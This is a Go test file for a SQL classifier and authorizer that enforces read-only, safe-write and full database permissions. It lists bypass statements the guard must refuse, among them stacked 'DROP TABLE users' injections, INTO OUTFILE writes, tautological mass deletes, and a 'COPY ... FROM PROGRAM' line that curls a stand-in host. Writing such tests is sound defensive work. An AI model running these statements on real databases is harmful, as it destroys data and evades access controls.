package database

import "testing"

// TestBypasses locks in the statements that a naive leading-verb classifier
// reports as reads. Every one of these would otherwise run on a connection
// configured as read-only.
func TestBypasses(t *testing.T) {
	tests := []struct {
		name string
		sql  string
		want Kind
	}{
		{"batch ddl", "SELECT 1; DROP TABLE users", KindUnknown},
		{"batch dml", "SELECT 1; DELETE FROM users", KindUnknown},
		{"batch after hash comment", "SELECT 1 # c\n; DROP TABLE users", KindUnknown},
		{"batch after backslash escape", `SELECT 'a\'; DROP TABLE users; --'`, KindUnknown},
		{"batch after bracket ident", "SELECT [a]; DROP TABLE users", KindUnknown},

		{"writable cte delete", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", KindWrite},
		{"writable cte insert", "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x", KindWrite},
		{"writable cte update", "WITH x AS (UPDATE t SET a=1 WHERE id=2 RETURNING *) SELECT * FROM x", KindWrite},
		{"writable cte ddl", "WITH x AS (SELECT 1) SELECT * FROM x", KindRead},

		{"locking read", "SELECT * FROM users FOR UPDATE", KindWrite},
		{"locking read share", "SELECT * FROM users FOR SHARE", KindWrite},
		{"into outfile", "SELECT * FROM users INTO OUTFILE '/tmp/pwn'", KindSchema},
		{"into dumpfile", "SELECT * FROM users INTO DUMPFILE '/tmp/pwn'", KindSchema},
		{"select into table", "SELECT * INTO newtable FROM users", KindSchema},

		{"mysql executable comment", "SHOW TRIGGERS; /*!50000 DELETE FROM t */", KindUnknown},
		{"explain analyze write", "EXPLAIN ANALYZE DELETE FROM users", KindWrite},

		// MySQL only treats -- as a comment when whitespace follows it, so
		// `1--1` is arithmetic and the batch is real on that engine.
		{"mysql dash dash without space", "SELECT 1--1; DROP TABLE users", KindUnknown},
		{"mysql dash dash before semicolon", "SELECT 1 --; DROP TABLE users", KindUnknown},

		// PRAGMA can change connection and schema state on SQLite.
		{"pragma assignment", "PRAGMA journal_mode = WAL", KindSession},
		{"pragma call form", "PRAGMA writable_schema(ON)", KindSession},
		{"pragma schema qualified assignment", "PRAGMA main.foreign_keys = OFF", KindSession},
		{"pragma maintenance", "PRAGMA wal_checkpoint", KindSchema},
		{"pragma incremental vacuum", "PRAGMA incremental_vacuum", KindSchema},
		{"pragma optimize", "PRAGMA optimize", KindSchema},
		{"pragma unknown", "PRAGMA something_new", KindSchema},
		{"pragma read setting", "PRAGMA journal_mode", KindRead},
		{"pragma read query", "PRAGMA main.table_info(users)", KindRead},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Classify(tt.sql); got != tt.want {
				t.Errorf("Classify(%q) = %q, want %q", tt.sql, got, tt.want)
			}
		})
	}
}

// TestBypassesAreRefusedReadOnly is the property that actually matters: none of
// the above may run with only read-only access.
func TestBypassesAreRefusedReadOnly(t *testing.T) {
	sqls := []string{
		"SELECT 1; DROP TABLE users",
		"SELECT 1; DELETE FROM users",
		"SELECT 1 # c\n; DROP TABLE users",
		`SELECT 'a\'; DROP TABLE users; --'`,
		"SELECT [a]; DROP TABLE users",
		"SELECT $$ x $$; DROP TABLE users",
		"WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x",
		"WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x",
		"SELECT * FROM users FOR UPDATE",
		"SELECT * FROM users INTO OUTFILE '/tmp/pwn'",
		"SELECT * INTO newtable FROM users",
		"SHOW TRIGGERS; /*!50000 DELETE FROM t */",
		"EXPLAIN ANALYZE DELETE FROM users",
		"SELECT 1 /* /* nested */ ; DROP TABLE users */",
		"SELECT 1--1; DROP TABLE users",
		"PRAGMA journal_mode = WAL",
		"PRAGMA writable_schema(ON)",
		"PRAGMA wal_checkpoint",
		"PRAGMA optimize",
		"DELETE FROM t WHERE NOT (id = 1 AND 1 = 2)",
		"DELETE FROM t WHERE NOT (id <> id OR 1 = 2)",
		"DELETE FROM t WHERE NOT (id NOT BETWEEN id AND id)",
	}

	for _, sql := range sqls {
		if _, err := Authorize("test", sql, PermissionReadOnly); err == nil {
			t.Errorf("read-only accepted %q (classified %q)", sql, Classify(sql))
		}
	}
}

func TestClassify(t *testing.T) {
	tests := []struct {
		name string
		sql  string
		want Kind
	}{
		{"select", "SELECT 1", KindRead},
		{"leading whitespace", "\n\t  SELECT 1  ", KindRead},
		{"line comment", "-- pick everything\nSELECT * FROM t", KindRead},
		{"cr line comment", "-- pick everything\rSELECT * FROM t", KindRead},
		{"hash comment", "# pick everything\nSELECT * FROM t", KindRead},
		{"block comment", "/* hint */ SELECT * FROM t", KindRead},
		// A nested block comment is genuinely ambiguous: PostgreSQL nests, so
		// the whole thing is a comment; MySQL ends it at the first */, leaving
		// trailing text as code. dbq takes the more dangerous reading.
		{"nested block comment is ambiguous", "/* a /* b */ c */ SELECT 1", KindUnknown},
		{"explain", "EXPLAIN SELECT 1", KindRead},
		{"explain options", "EXPLAIN (ANALYZE, BUFFERS) SELECT 1", KindRead},
		{"show", "SHOW TABLES", KindRead},
		{"pragma", "PRAGMA table_info(t)", KindRead},
		{"cte select", "WITH x AS (SELECT 1) SELECT * FROM x", KindRead},
		{"trailing semicolon", "SELECT 1;", KindRead},
		{"repeated semicolons", "SELECT 1;;", KindRead},

		{"insert", "INSERT INTO t VALUES (1)", KindWrite},
		{"update", "UPDATE t SET a = 1 WHERE id = 2", KindWrite},
		{"delete", "DELETE FROM t WHERE id = 2", KindWrite},
		{"merge", "MERGE INTO t USING s ON (1=1)", KindWrite},

		{"drop", "DROP TABLE t", KindSchema},
		{"create", "CREATE TABLE t (a int)", KindSchema},
		{"grant", "GRANT ALL ON t TO bob", KindSchema},
		{"copy", "COPY t FROM PROGRAM 'curl evil.sh'", KindSchema},

		{"begin", "BEGIN", KindSession},
		{"commit", "COMMIT", KindSession},
		{"use", "USE otherdb", KindSession},
		{"set", "SET search_path = public", KindSession},

		{"empty", "", KindUnknown},
		{"only comment", "-- nothing here", KindUnknown},
		{"gibberish", "frobnicate the widgets", KindUnknown},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Classify(tt.sql); got != tt.want {
				t.Errorf("Classify(%q) = %q, want %q", tt.sql, got, tt.want)
			}
		})
	}
}

// TestClassifyLiteralsAreNotVerbs guards the main evasion path: hiding a
// statement verb inside a string literal or a quoted identifier.
func TestClassifyLiteralsAreNotVerbs(t *testing.T) {
	tests := []struct {
		name string
		sql  string
		want Kind
	}{
		{"verb in string literal", "SELECT 'DROP TABLE users' AS msg", KindRead},
		{"escaped quote", "SELECT 'it''s DROP' AS msg", KindRead},
		{"backslash escaped quote", `SELECT 'a\' DROP TABLE t' AS msg`, KindRead},
		{"quoted identifier", `SELECT "delete" FROM t`, KindRead},
		{"backtick identifier", "SELECT `update` FROM t", KindRead},
		{"bracket identifier", "SELECT [drop] FROM t", KindRead},
		{"dollar quoted", "SELECT $$ DROP TABLE users $$", KindRead},
		{"tagged dollar quoted", "SELECT $tag$ DROP TABLE users $tag$", KindRead},
		{"semicolon in literal", "SELECT 'a; DROP TABLE t'", KindRead},
		{"semicolon in identifier", `SELECT "a; DROP TABLE t" FROM t`, KindRead},
		{"comment mentions drop", "SELECT 1 /* DROP TABLE t */", KindRead},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Classify(tt.sql); got != tt.want {
				t.Errorf("Classify(%q) = %q, want %q", tt.sql, got, tt.want)
			}
		})
	}
}

// TestUnboundedWrites checks the blast-radius axis: a bounded write only needs
// safe-write, an unbounded one needs full.
func TestUnboundedWrites(t *testing.T) {
	tests := []struct {
		name          string
		sql           string
		wantUnbounded bool
	}{
		// Bounded.
		{"delete with predicate", "DELETE FROM users WHERE id = 1", false},
		{"update with predicate", "UPDATE users SET a = 1 WHERE id = 1", false},
		{"insert values", "INSERT INTO t (a) VALUES (1)", false},
		{"insert on conflict do nothing", "INSERT INTO t VALUES (1) ON CONFLICT DO NOTHING", false},
		{"function on column", "DELETE FROM users WHERE lower(email) = 'a@b.c'", false},
		{"and narrows tautology", "DELETE FROM users WHERE (id = 1 OR id <> 1) AND tenant_id = 5", false},
		{"different columns or", "DELETE FROM users WHERE id IS NULL OR status IS NOT NULL", false},
		{"different values or", "DELETE FROM users WHERE status = 'a' OR status <> 'b'", false},
		{"like prefix", "DELETE FROM users WHERE name LIKE 'admin%'", false},
		{"in list", "DELETE FROM users WHERE id IN (1, 2, 3)", false},
		{"between range", "DELETE FROM users WHERE id BETWEEN 1 AND 5", false},
		{"or with between", "DELETE FROM users WHERE id = 9 OR id BETWEEN 1 AND 5", false},
		{"not equal", "DELETE FROM users WHERE NOT id = 1", false},
		{"not between self", "DELETE FROM users WHERE id NOT BETWEEN id AND id", false},
		{"negated between self", "DELETE FROM users WHERE NOT id BETWEEN id AND id", false},
		{"insert scalar subquery in values", "INSERT INTO t (a) VALUES ((SELECT max(a) FROM t))", false},
		{"insert default values", "INSERT INTO t DEFAULT VALUES", false},

		// Unbounded: no predicate.
		{"delete all", "DELETE FROM users", true},
		{"update all", "UPDATE users SET active = false", true},
		{"delete with limit only", "DELETE FROM users LIMIT 10", true},

		// Unbounded: constant predicates.
		{"where 1=1", "DELETE FROM users WHERE 1 = 1", true},
		{"where true", "DELETE FROM users WHERE TRUE", true},
		{"where 2>1", "DELETE FROM users WHERE 2 > 1", true},
		{"where constant fn", "DELETE FROM users WHERE abs(1) = 1", true},
		{"where lower literal", "DELETE FROM users WHERE lower('A') = 'a'", true},
		{"where current_user", "DELETE FROM users WHERE USER = CURRENT_USER", true},
		{"where parenthesised true", "DELETE FROM users WHERE (((TRUE)))", true},

		// Unbounded: self comparison.
		{"self comparison", "DELETE FROM users WHERE id = id", true},
		{"self comparison fn", "DELETE FROM users WHERE lower(email) = lower(email)", true},
		{"negated self inequality", "DELETE FROM users WHERE NOT (id <> id)", true},
		{"negated self less", "DELETE FROM users WHERE NOT id < id", true},
		{"double negated self equality", "DELETE FROM users WHERE NOT NOT id = id", true},
		{"between self", "DELETE FROM users WHERE id BETWEEN id AND id", true},
		{"negated not between self", "DELETE FROM users WHERE NOT (id NOT BETWEEN id AND id)", true},
		{"negated compound and", "DELETE FROM users WHERE NOT (id = 1 AND 1 = 2)", true},
		{"negated compound or", "DELETE FROM users WHERE NOT (id <> id OR 1 = 2)", true},
		{"between as alias", "DELETE FROM users AS between WHERE between.id = between.id AND 1 = 1", true},
		{"between as column", "DELETE FROM users WHERE between = between AND id = id", true},

		// Unbounded: match-everything patterns.
		{"like percent", "DELETE FROM users WHERE name LIKE '%'", true},
		{"like double percent", "DELETE FROM users WHERE name LIKE '%%'", true},

		// Unbounded: complementary OR branches.
		{"or complementary eq", "DELETE FROM users WHERE id = 1 OR id <> 1", true},
		{"or complementary mirrored", "DELETE FROM users WHERE id != 1 OR 1 = id", true},
		{"or complementary gt", "DELETE FROM users WHERE id > 1 OR id <= 1", true},
		{"or complementary null", "DELETE FROM users WHERE id IS NULL OR id IS NOT NULL", true},
		{"or complementary not null", "DELETE FROM users WHERE id IS NULL OR NOT (id IS NULL)", true},
		{"or non adjacent", "DELETE FROM users WHERE id = 1 OR status = 'x' OR id <> 1", true},
		{"or with tautology branch", "DELETE FROM users WHERE id = id OR status = 'x'", true},
		{"or mixing and", "DELETE FROM users WHERE id = 1 OR (id <> 1 AND TRUE)", true},

		// Unbounded: subqueries and multi-table targets.
		{"subquery predicate", "DELETE FROM users WHERE id IN (SELECT id FROM archived)", true},
		{"exists predicate", "DELETE FROM users WHERE EXISTS (SELECT 1 FROM archived)", true},
		{"update from", "UPDATE users SET a = 1 FROM other WHERE users.id = other.id", true},
		{"delete using", "DELETE FROM users USING other WHERE users.id = other.id", true},
		{"delete join", "DELETE u FROM users u JOIN other o ON u.id = o.id WHERE o.x = 1", true},

		// Unbounded: reach-extending INSERT forms.
		{"insert select", "INSERT INTO t SELECT * FROM other", true},
		{"insert parenthesised select", "INSERT INTO t (SELECT * FROM other)", true},
		{"insert columns parenthesised select", "INSERT INTO t (a, b) (SELECT a, b FROM other)", true},
		{"insert table", "INSERT INTO t TABLE other", true},
		{"insert doubly parenthesised select", "INSERT INTO t ((SELECT * FROM other))", true},
		{"insert set subquery", "INSERT INTO t SET a = (SELECT max(a) FROM other)", true},
		{"insert cte", "INSERT INTO t WITH x AS (SELECT 1) SELECT * FROM x", true},
		{"insert on duplicate key", "INSERT INTO t VALUES (1) ON DUPLICATE KEY UPDATE a = 1", true},
		{"insert on conflict do update", "INSERT INTO t VALUES (1) ON CONFLICT (id) DO UPDATE SET a = 1", true},
		{"replace into", "REPLACE INTO t VALUES (1)", true},
		{"merge", "MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET a = 1", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Analyze(tt.sql)

			if got.Kind != KindWrite {
				t.Fatalf("Analyze(%q).Kind = %q, want %q", tt.sql, got.Kind, KindWrite)
			}

			if got.Unbounded != tt.wantUnbounded {
				t.Errorf("Analyze(%q).Unbounded = %v, want %v (reason: %s)",
					tt.sql, got.Unbounded, tt.wantUnbounded, got.Reason)
			}
		})
	}
}

func TestAuthorize(t *testing.T) {
	tests := []struct {
		name    string
		sql     string
		granted Permission
		allowed bool
	}{
		{"read on read-only", "SELECT 1", PermissionReadOnly, true},
		{"write on read-only", "DELETE FROM t WHERE id=1", PermissionReadOnly, false},
		{"ddl on read-only", "DROP TABLE t", PermissionReadOnly, false},

		{"read on safe-write", "SELECT 1", PermissionSafeWrite, true},
		{"bounded write on safe-write", "DELETE FROM t WHERE id = 1", PermissionSafeWrite, true},
		{"unbounded write on safe-write", "DELETE FROM t", PermissionSafeWrite, false},
		{"tautology write on safe-write", "DELETE FROM t WHERE 1=1", PermissionSafeWrite, false},
		{"ddl on safe-write", "DROP TABLE t", PermissionSafeWrite, false},

		{"unbounded write on full", "DELETE FROM t", PermissionFull, true},
		{"ddl on full", "DROP TABLE t", PermissionFull, true},

		// Fail closed.
		{"unknown on read-only", "frobnicate t", PermissionReadOnly, false},
		{"unknown on safe-write", "frobnicate t", PermissionSafeWrite, false},
		{"unknown on full", "frobnicate t", PermissionFull, true},

		// Refused at every level.
		{"transaction on full", "BEGIN", PermissionFull, false},
		{"use on full", "USE other", PermissionFull, false},
		{"multi statement on full", "SELECT 1; SELECT 2", PermissionFull, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Authorize("test", tt.sql, tt.granted)

			if tt.allowed && err != nil {
				t.Errorf("Authorize(%q, %q) = %v, want allowed", tt.sql, tt.granted, err)
			}

			if !tt.allowed && err == nil {
				t.Errorf("Authorize(%q, %q) = nil, want denied", tt.sql, tt.granted)
			}
		})
	}
}

// TestErrorNeverLeaksSQL checks that a rejection message does not echo the
// statement, which routinely carries data that should not be copied into logs
// or model context.
func TestErrorNeverLeaksSQL(t *testing.T) {
	const secret = "s3cr3t_value_marker"

	_, err := Authorize("prod", "DELETE FROM users WHERE token = '"+secret+"' OR 1=1", PermissionSafeWrite)
	if err == nil {
		t.Fatal("expected a denial")
	}

	if got := err.Error(); contains(got, secret) {
		t.Errorf("error message leaked the statement: %s", got)
	}
}

func contains(haystack, needle string) bool {
	return len(haystack) >= len(needle) && stringIndex(haystack, needle) >= 0
}

func stringIndex(haystack, needle string) int {
	for i := 0; i+len(needle) <= len(haystack); i++ {
		if haystack[i:i+len(needle)] == needle {
			return i
		}
	}

	return -1
}
